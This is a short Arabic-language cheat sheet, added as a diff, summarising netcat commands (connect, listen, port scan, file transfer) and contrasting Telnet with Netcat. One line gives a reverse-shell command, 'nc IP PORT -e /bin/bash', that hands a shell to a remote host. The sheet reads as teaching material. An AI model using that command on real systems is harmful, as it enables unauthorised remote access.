@@ -1,0 +1,13 @@
+✅ ملخص الأوامر:
+الأمر	الغرض
+nc IP PORT	الاتصال ببورت
+nc -lvp PORT	الاستماع لبورت
+nc -zv IP PORT_RANGE	فحص بورتات
+nc IP PORT < file / > file	نقل ملفات
+nc IP PORT -e /bin/bash	Reverse Shell
+
+🎯 خلاصة سريعة:
+Telnet = اتصال بسيط بجهاز عن طريق telnet protocol (بورت 23).
+
+Netcat = أداة متعددة الاستخدامات، أقوى وأشمل، تنفع لأي بورت.
+
